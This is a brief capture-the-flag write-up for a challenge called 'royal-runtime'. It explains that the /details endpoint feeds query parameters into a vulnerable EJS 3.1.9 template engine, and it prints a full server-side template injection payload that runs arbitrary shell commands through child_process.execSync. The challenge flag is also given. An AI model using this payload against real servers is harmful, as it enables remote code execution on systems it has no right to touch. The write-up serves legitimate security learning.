# royal-runtime

## Write-up

- Basically check the /details endpoint as it accepts any query, you can take advantage of this to put injection payload as the EJS version used in this challenge is vulnrable.
- The flag is located in the root of the machine.
- [EJS@3.1.9 has a server-side template injection vulnerability](https://github.com/mde/ejs/issues/735)

> Payload used is:
> ?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor.\_load('child_process').execSync('THE COMMAND YOU WANT TO PERFORM');

## Flag

`shellmates{WE_t0ld_y0U,_U$3_EJs_4T_y0UR_oWn_RI$K!!}`
